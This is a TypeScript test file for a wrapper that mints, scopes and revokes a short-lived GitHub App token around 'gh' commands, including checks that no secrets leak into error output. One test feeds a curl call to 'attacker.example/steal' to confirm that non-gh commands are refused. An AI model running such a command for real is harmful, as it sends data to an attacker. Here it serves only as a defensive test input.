import { generateKeyPairSync, verify } from 'node:crypto';
import { describe, expect, it, vi } from 'vitest';
import {
	assertKeyPermissions,
	fetchInstallationId,
	fetchInstallationToken,
	mintAppJwt,
	parseOwnerRepo,
	run,
	type Dependencies
} from './as-owen';

const { publicKey, privateKey } = generateKeyPairSync('rsa', {
	modulusLength: 2048,
	publicKeyEncoding: { type: 'spki', format: 'pem' },
	privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
});

function decodeSegment(segment: string): unknown {
	return JSON.parse(Buffer.from(segment, 'base64url').toString('utf8'));
}

/** Replaces `!` (banned by lint) with a real check that fails the test with a clear message. */
function defined<T>(value: T | undefined): T {
	if (value === undefined) throw new Error('Expected a defined value in test setup.');
	return value;
}

interface FetchCall {
	url: string;
	init: RequestInit | undefined;
}

function authorization(call: FetchCall): string {
	return (call.init?.headers as { Authorization: string }).Authorization;
}

describe('mintAppJwt', () => {
	it('mints a well-formed RS256 JWT that verifies with the matching public key', () => {
		const nowMs = Date.parse('2026-09-03T12:00:00Z');
		const token = mintAppJwt('4578638', privateKey, nowMs);

		const [headerSegment, payloadSegment, signatureSegment] = token.split('.');
		expect(decodeSegment(defined(headerSegment))).toEqual({ alg: 'RS256', typ: 'JWT' });

		const nowSeconds = Math.floor(nowMs / 1000);
		expect(decodeSegment(defined(payloadSegment))).toEqual({
			iat: nowSeconds - 60,
			exp: nowSeconds + 9 * 60,
			iss: 4578638
		});

		const signingInput = `${defined(headerSegment)}.${defined(payloadSegment)}`;
		const signature = Buffer.from(defined(signatureSegment), 'base64url');
		expect(verify('RSA-SHA256', Buffer.from(signingInput), publicKey, signature)).toBe(true);
	});
});

describe('assertKeyPermissions', () => {
	it('refuses a key file readable by group or others', () => {
		expect(() => assertKeyPermissions(0o100644, '/tmp/key.pem')).toThrow(/chmod 600/);
	});

	it('accepts a key file readable only by its owner', () => {
		expect(() => assertKeyPermissions(0o100600, '/tmp/key.pem')).not.toThrow();
	});
});

describe('parseOwnerRepo', () => {
	it('parses an ssh-style origin remote', () => {
		expect(parseOwnerRepo('git@github.com:Gabes-Tint/Fit_.git')).toEqual({
			owner: 'Gabes-Tint',
			repo: 'Fit_'
		});
	});

	it('parses an https-style origin remote', () => {
		expect(parseOwnerRepo('https://github.com/Gabes-Tint/Fit_.git')).toEqual({
			owner: 'Gabes-Tint',
			repo: 'Fit_'
		});
	});

	it('throws for a remote that does not look like github.com', () => {
		expect(() => parseOwnerRepo('https://example.com/x/y.git')).toThrow(/owner\/repo/);
	});
});

describe('fetchInstallationId and fetchInstallationToken', () => {
	it('rejects a non-ok installation lookup', async () => {
		const fetchImpl = vi
			.fn()
			.mockResolvedValue({ ok: false, status: 404, statusText: 'Not Found' });
		await expect(
			fetchInstallationId(fetchImpl as typeof fetch, 'jwt', 'owner', 'repo')
		).rejects.toThrow(/404/);
	});

	it('rejects a non-ok token exchange', async () => {
		const fetchImpl = vi
			.fn()
			.mockResolvedValue({ ok: false, status: 403, statusText: 'Forbidden' });
		await expect(
			fetchInstallationToken(fetchImpl as typeof fetch, 'jwt', 1, 'Fit_')
		).rejects.toThrow(/403/);
	});
});

function fakeDependencies(overrides: Partial<Dependencies> = {}): {
	deps: Dependencies;
	calls: FetchCall[];
	spawnCalls: Array<{ command: string; args: string[]; env: NodeJS.ProcessEnv }>;
} {
	const calls: FetchCall[] = [];
	const spawnCalls: Array<{ command: string; args: string[]; env: NodeJS.ProcessEnv }> = [];

	const fetchImpl = vi.fn((input: string, init?: RequestInit) => {
		calls.push({ url: input, init });
		if (input.endsWith('/installation')) {
			return Promise.resolve({
				ok: true,
				status: 200,
				statusText: 'OK',
				json: () => Promise.resolve({ id: 987 })
			} as Response);
		}
		if (input.endsWith('/access_tokens')) {
			return Promise.resolve({
				ok: true,
				status: 201,
				statusText: 'Created',
				json: () => Promise.resolve({ token: 'installation-token-xyz' })
			} as Response);
		}
		if (input.endsWith('/installation/token')) {
			return Promise.resolve({ ok: true, status: 204, statusText: 'No Content' } as Response);
		}
		return Promise.reject(new Error(`Unexpected fetch: ${input}`));
	});

	const spawnChild = vi.fn((command: string, args: string[], env: NodeJS.ProcessEnv) => {
		spawnCalls.push({ command, args, env });
		return Promise.resolve(0);
	});

	const deps: Dependencies = {
		readKeyFile: () => privateKey,
		statKeyFile: () => ({ mode: 0o100600 }),
		fetchImpl: fetchImpl as unknown as typeof fetch,
		spawnChild,
		getOriginUrl: () => 'git@github.com:Gabes-Tint/Fit_.git',
		now: () => Date.now(),
		...overrides
	};

	return { deps, calls, spawnCalls };
}

describe('run', () => {
	it('mints a scoped token through two requests, hands it to the child, then revokes it', async () => {
		const { deps, calls, spawnCalls } = fakeDependencies();
		const env = { FIT_GITHUB_APP_KEY: '/secrets/owen.pem', PATH: '/usr/bin' };

		const exitCode = await run(['gh', 'issue', 'comment', '28', '--body', 'hello'], env, deps);

		expect(exitCode).toBe(0);

		expect(calls).toHaveLength(3);
		const installationCall = defined(calls[0]);
		const tokenCall = defined(calls[1]);
		const revokeCall = defined(calls[2]);
		expect(installationCall.url).toBe('https://api.github.com/repos/Gabes-Tint/Fit_/installation');
		expect(installationCall.init?.method ?? 'GET').toBe('GET');
		expect(authorization(installationCall)).toMatch(/^Bearer /);
		expect(tokenCall.url).toBe('https://api.github.com/app/installations/987/access_tokens');
		expect(tokenCall.init?.method).toBe('POST');
		expect(JSON.parse(tokenCall.init?.body as string)).toEqual({
			repositories: ['Fit_'],
			permissions: { issues: 'write', pull_requests: 'write' }
		});
		expect(revokeCall.url).toBe('https://api.github.com/installation/token');
		expect(revokeCall.init?.method).toBe('DELETE');
		expect((revokeCall.init?.headers as { Authorization: string }).Authorization).toBe(
			'token installation-token-xyz'
		);

		expect(spawnCalls).toHaveLength(1);
		const spawnCall = defined(spawnCalls[0]);
		expect(spawnCall.command).toBe('gh');
		expect(spawnCall.args).toEqual(['issue', 'comment', '28', '--body', 'hello']);
		expect(spawnCall.env.GH_TOKEN).toBe('installation-token-xyz');
		expect(spawnCall.env.PATH).toBe('/usr/bin');
	});

	it('revokes the token even when the child command fails', async () => {
		const { deps, calls } = fakeDependencies({ spawnChild: () => Promise.resolve(17) });
		const exitCode = await run(['gh'], { FIT_GITHUB_APP_KEY: '/secrets/owen.pem' }, deps);
		expect(exitCode).toBe(17);
		expect(calls.some((call) => call.url === 'https://api.github.com/installation/token')).toBe(
			true
		);
	});

	it('refuses a command other than gh, without minting any token', async () => {
		const { deps, calls, spawnCalls } = fakeDependencies();
		const exitCode = await run(
			['curl', 'https://attacker.example/steal'],
			{ FIT_GITHUB_APP_KEY: '/secrets/owen.pem' },
			deps
		);
		expect(exitCode).toBe(1);
		expect(calls).toHaveLength(0);
		expect(spawnCalls).toHaveLength(0);
	});

	it('defaults FIT_GITHUB_APP_ID to 4578638 when unset', async () => {
		const { deps, calls } = fakeDependencies();
		await run(['gh'], { FIT_GITHUB_APP_KEY: '/secrets/owen.pem' }, deps);

		const jwt = authorization(defined(calls[0])).slice('Bearer '.length);
		const payloadSegment = defined(jwt.split('.')[1]);
		expect(decodeSegment(payloadSegment)).toMatchObject({ iss: 4578638 });
	});

	it('honors an explicit FIT_GITHUB_APP_ID', async () => {
		const { deps, calls } = fakeDependencies();
		await run(['gh'], { FIT_GITHUB_APP_KEY: '/secrets/owen.pem', FIT_GITHUB_APP_ID: '99' }, deps);

		const jwt = authorization(defined(calls[0])).slice('Bearer '.length);
		const payloadSegment = defined(jwt.split('.')[1]);
		expect(decodeSegment(payloadSegment)).toMatchObject({ iss: 99 });
	});

	it('refuses when FIT_GITHUB_APP_KEY is unset', async () => {
		const { deps, calls, spawnCalls } = fakeDependencies();
		const exitCode = await run(['gh'], {}, deps);
		expect(exitCode).toBe(1);
		expect(calls).toHaveLength(0);
		expect(spawnCalls).toHaveLength(0);
	});

	it('refuses when the key file does not exist', async () => {
		const { deps, spawnCalls } = fakeDependencies({ statKeyFile: () => undefined });
		const exitCode = await run(['gh'], { FIT_GITHUB_APP_KEY: '/missing.pem' }, deps);
		expect(exitCode).toBe(1);
		expect(spawnCalls).toHaveLength(0);
	});

	it('refuses a group- or world-readable key file without making any request', async () => {
		const { deps, calls, spawnCalls } = fakeDependencies({
			statKeyFile: () => ({ mode: 0o100644 })
		});
		const exitCode = await run(['gh'], { FIT_GITHUB_APP_KEY: '/secrets/owen.pem' }, deps);
		expect(exitCode).toBe(1);
		expect(calls).toHaveLength(0);
		expect(spawnCalls).toHaveLength(0);
	});

	it('refuses when no command is given', async () => {
		const { deps, spawnCalls } = fakeDependencies();
		const exitCode = await run([], { FIT_GITHUB_APP_KEY: '/secrets/owen.pem' }, deps);
		expect(exitCode).toBe(1);
		expect(spawnCalls).toHaveLength(0);
	});

	it('fails cleanly with a malformed (non-RSA) key instead of an unhandled rejection', async () => {
		const { deps, calls, spawnCalls } = fakeDependencies({
			readKeyFile: () => 'not a real private key'
		});
		const exitCode = await run(['gh'], { FIT_GITHUB_APP_KEY: '/secrets/owen.pem' }, deps);
		expect(exitCode).toBe(1);
		expect(calls).toHaveLength(0);
		expect(spawnCalls).toHaveLength(0);
	});

	it('fails cleanly when FIT_GITHUB_APP_ID is not numeric', async () => {
		const { deps, calls } = fakeDependencies();
		const exitCode = await run(
			['gh'],
			{ FIT_GITHUB_APP_KEY: '/secrets/owen.pem', FIT_GITHUB_APP_ID: 'not-a-number' },
			deps
		);
		expect(exitCode).toBe(1);
		expect(calls).toHaveLength(0);
	});

	describe('secret redaction on failure paths', () => {
		const secretKeyPath = '/secrets/owen-super-secret.pem';
		const secretKeyContents = privateKey;

		function captureConsoleErrors(): { logs: string[]; restore: () => void } {
			const logs: string[] = [];
			const original = console.error;
			console.error = (...args: unknown[]) => {
				logs.push(args.map(String).join(' '));
			};
			return {
				logs,
				restore: () => {
					console.error = original;
				}
			};
		}

		it('never prints the key path contents or a minted token when the key is unreadable', async () => {
			const { deps } = fakeDependencies({ statKeyFile: () => undefined });
			const { logs, restore } = captureConsoleErrors();
			try {
				await run(['gh'], { FIT_GITHUB_APP_KEY: secretKeyPath }, deps);
			} finally {
				restore();
			}
			const output = logs.join('\n');
			expect(output).not.toContain(secretKeyContents);
			expect(output).not.toContain('installation-token-xyz');
		});

		it('never prints the key contents or token when the installation lookup fails', async () => {
			const fetchImpl = vi.fn().mockRejectedValue(new Error('network is down'));
			const { deps } = fakeDependencies({ fetchImpl: fetchImpl as unknown as typeof fetch });
			const { logs, restore } = captureConsoleErrors();
			try {
				await run(['gh'], { FIT_GITHUB_APP_KEY: secretKeyPath }, deps);
			} finally {
				restore();
			}
			const output = logs.join('\n');
			expect(output).not.toContain(secretKeyContents);
			expect(output).not.toContain('installation-token-xyz');
		});

		it('never prints the key contents when minting the JWT fails on a malformed key', async () => {
			const { deps } = fakeDependencies({ readKeyFile: () => 'not a real private key' });
			const { logs, restore } = captureConsoleErrors();
			try {
				await run(['gh'], { FIT_GITHUB_APP_KEY: secretKeyPath }, deps);
			} finally {
				restore();
			}
			const output = logs.join('\n');
			expect(output).not.toContain(secretKeyContents);
			expect(output).not.toContain('not a real private key');
		});
	});
});
